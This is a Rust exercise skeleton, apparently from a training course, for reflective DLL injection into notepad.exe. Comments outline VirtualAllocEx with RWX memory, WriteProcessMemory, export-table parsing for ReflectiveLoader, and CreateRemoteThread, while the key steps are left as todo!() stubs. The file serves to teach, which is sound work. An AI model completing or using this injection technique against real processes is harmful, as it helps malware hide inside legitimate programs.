use std::ffi::c_void;
use windows::Win32::Foundation::GetLastError;
use windows::Win32::System::Diagnostics::Debug::{
    IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64,
    WriteProcessMemory,
};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
};
use windows::Win32::System::Threading::{
    CreateRemoteThread, INFINITE, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION,
    PROCESS_VM_WRITE, WaitForSingleObject,
};

// Build 07-reflective-payload first, then this crate.
const DLL_BYTES: &[u8] = include_bytes!(
    "../../target/x86_64-pc-windows-gnu/debug/reflective_payload.dll"
);

fn main() {
    unsafe {
        // Step 1 — Find notepad.exe PID (same as Modules 02 and 03).
        let pid: u32 = todo!("enumerate processes, return notepad.exe PID");

        // Step 2 — Open the target process.
        let handle = todo!("OpenProcess with VM_OPERATION | VM_WRITE | CREATE_THREAD");

        // Step 3 — Allocate space for the raw DLL bytes in the target.
        // PAGE_EXECUTE_READWRITE: the ReflectiveLoader stub executes from this region
        // while it sets up the real mapping elsewhere.
        //
        // VirtualAllocEx(
        //     hprocess: HANDLE,                          // target process
        //     lpaddress: Option<*const c_void>,          // None
        //     dwsize: usize,                             // DLL_BYTES.len()
        //     flallocationtype: VIRTUAL_ALLOCATION_TYPE, // MEM_COMMIT | MEM_RESERVE
        //     flprotect: PAGE_PROTECTION_FLAGS,          // PAGE_EXECUTE_READWRITE
        // ) -> *mut c_void                               // remote base; NULL on failure
        let remote_base: *mut c_void = todo!("VirtualAllocEx for DLL bytes");
        if remote_base.is_null() {
            panic!("VirtualAllocEx failed: {:?}", GetLastError());
        }

        // Step 4 — Write the raw DLL bytes into the remote allocation.
        todo!("WriteProcessMemory: DLL_BYTES → remote_base");

        // Step 5 — Find the RVA of ReflectiveLoader within the local DLL bytes.
        // Parse the export directory to find the function by name.
        //
        // Hint: IMAGE_OPTIONAL_HEADER64.DataDirectory[0] is IMAGE_DATA_DIRECTORY
        //       for the export table. Follow its VirtualAddress to IMAGE_EXPORT_DIRECTORY.
        //       Walk AddressOfNames to find "ReflectiveLoader", look up its RVA via
        //       AddressOfNameOrdinals and AddressOfFunctions.
        //
        // The callable address in the target is: remote_base as usize + rva
        let loader_rva: usize = todo!("parse export directory, find ReflectiveLoader RVA");
        let remote_loader = remote_base as usize + loader_rva;

        // Step 6 — Create a remote thread at ReflectiveLoader.
        // lpparameter is None — the loader finds the DLL base by walking backward
        // from its own instruction pointer.
        //
        // CreateRemoteThread(
        //     hprocess: HANDLE,
        //     lpthreadattributes: Option<*const SECURITY_ATTRIBUTES>, // None
        //     dwstacksize: usize,                                     // 0
        //     lpstartaddress: LPTHREAD_START_ROUTINE,                 // transmute(remote_loader)
        //     lpparameter: Option<*const c_void>,                     // None
        //     dwcreationflags: u32,                                   // 0
        //     lpthreadid: Option<*mut u32>,                           // None
        // ) -> Result<HANDLE>
        let thread = todo!("CreateRemoteThread at remote_loader");

        WaitForSingleObject(thread, INFINITE);
    }
}
